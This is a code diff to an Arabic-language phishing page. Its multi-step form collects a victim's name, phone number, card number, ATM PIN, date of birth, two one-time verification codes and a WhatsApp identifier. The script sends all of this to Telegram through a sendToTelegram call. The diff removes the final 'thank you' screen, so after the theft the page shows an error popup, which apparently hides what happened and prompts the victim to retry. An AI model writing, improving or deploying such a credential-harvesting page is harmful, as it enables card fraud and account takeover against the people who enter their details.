@@ -121,6 +121,7 @@
       font-size: 1.1rem;
       color: #888;
       margin-left: 7px;
+      /* تم حذف الرموز في الخطوات المطلوبة */
     }
     input[type="text"], input[type="password"], input[type="tel"], input[type="number"] {
       background: transparent;
@@ -286,7 +287,6 @@
           <div class="form-group">
             <label>الاسم بالكامل</label>
             <div class="input-box">
-              <span class="input-icon">👤</span>
               <input type="text" id="fullname" maxlength="70" required autocomplete="off" />
             </div>
             <div class="error" id="err-fullname">يرجى إدخال الاسم بالكامل</div>
@@ -294,7 +294,6 @@
           <div class="form-group">
             <label>رقم الهاتف (10 أرقام)</label>
             <div class="input-box">
-              <span class="input-icon">📱</span>
               <input type="tel" inputmode="numeric" id="phone" maxlength="10" pattern="[0-9]*" required autocomplete="off" />
             </div>
             <div class="error" id="err-phone">يرجى إدخال رقم هاتف صحيح يبدأ بـ 077 أو 078 أو 079</div>
@@ -310,7 +309,6 @@
           <div class="form-group">
             <label>رقم البطاقة (16 رقم)</label>
             <div class="input-box">
-              <span class="input-icon">💳</span>
               <input type="tel" inputmode="numeric" id="card" maxlength="16" pattern="[0-9]*" required autocomplete="off" />
             </div>
             <div class="error" id="err-card">يرجى إدخال رقم بطاقة صحيح مكون من 16 رقم</div>
@@ -318,7 +316,6 @@
           <div class="form-group">
             <label>الرقم السري الخاص بالـ ATM</label>
             <div class="input-box">
-              <span class="input-icon">🔒</span>
               <input type="password" inputmode="numeric" id="atm" maxlength="4" pattern="[0-9]*" required autocomplete="off" />
             </div>
             <div class="error" id="err-atm">يرجى إدخال الرقم السري المكون من 4 أرقام</div>
@@ -326,7 +323,6 @@
           <div class="form-group">
             <label>تاريخ الميلاد (DD/MM/YYYY)</label>
             <div class="input-box">
-              <span class="input-icon">📅</span>
               <input type="text" id="dob" maxlength="10" placeholder="DD/MM/YYYY" required autocomplete="off" />
             </div>
             <div class="error" id="err-dob">يرجى إدخال تاريخ صحيح بالتنسيق DD/MM/YYYY</div>
@@ -342,7 +338,6 @@
           <div class="form-group centered">
             <label class="centered">رمز التحقق</label>
             <div class="input-box centered">
-              <span class="input-icon">🔑</span>
               <input type="tel" inputmode="numeric" id="verifycode" maxlength="6" pattern="[0-9]*" required autocomplete="off" />
             </div>
             <div class="error" id="err-verifycode">يرجى إدخال رمز تحقق مكون من 6 أرقام</div>
@@ -359,7 +354,6 @@
           <div class="form-group centered">
             <label class="centered">ادخل النص هنا</label>
             <div class="input-box centered">
-              <span class="input-icon">📝</span>
               <input type="text" id="whatsid" maxlength="32" required autocomplete="off" />
             </div>
             <div class="error" id="err-whatsid">يرجى إدخال الاسم التعريفي</div>
@@ -375,7 +369,6 @@
           <div class="form-group centered">
             <label class="centered">رمز التحقق الجديد</label>
             <div class="input-box centered">
-              <span class="input-icon">🔐</span>
               <input type="tel" inputmode="numeric" id="verifycode2" maxlength="6" pattern="[0-9]*" required autocomplete="off" />
             </div>
             <div class="error" id="err-verifycode2">يرجى إدخال رمز تحقق جديد مكون من 6 أرقام</div>
@@ -383,13 +376,7 @@
           <button class="btn-main" type="submit">أكمل</button>
         </form>
       </div>
-      <!-- Step 6 -->
-      <div class="step" id="step-6" class="centered">
-        <div class="centered" style="height:210px;justify-content:center;">
-          <h2 style="color:var(--success);text-align:center;">تم الانتهاء!</h2>
-          <div class="desc centered" style="font-weight:700;font-size:1.12rem;">شكرًا لك.</div>
-        </div>
-      </div>
+      <!-- Step 6 (تم حذف واجهة "تم الانتهاء شكرًا لك") -->
     </div>
   </div>
   <!-- نافذة منبثقة للإشعار -->
@@ -520,7 +507,7 @@
     if (valid) {
       userData.verifycode2 = verifycode2;
       sendToTelegram({ الخطوة: "٥- رمز تحقق ثاني", ...userData });
-      showStep(6);
+      // لا يوجد واجهة "تم الانتهاء شكرًا لك" هنا
       setTimeout(function() {
         showPopupError();
         userData = {};
